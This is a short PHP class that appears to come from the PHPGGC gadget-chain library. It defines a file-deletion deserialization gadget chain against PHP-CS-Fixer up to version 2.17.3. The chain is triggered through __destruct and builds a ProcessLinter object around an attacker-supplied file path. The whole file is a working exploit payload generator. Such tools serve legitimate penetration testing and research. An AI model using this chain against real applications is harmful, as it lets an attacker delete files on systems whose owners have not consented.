<?php

namespace GadgetChain\PHPCSFixer;

class FD2 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '<= 2.17.3';
    public static $vector = '__destruct';
    public static $author = 'snoopysecurity';

    public function generate(array $parameters)
    {
        $remote_file = $parameters["remote_file"];

        return new \PhpCsFixer\Linter\ProcessLinter($remote_file);
    }
}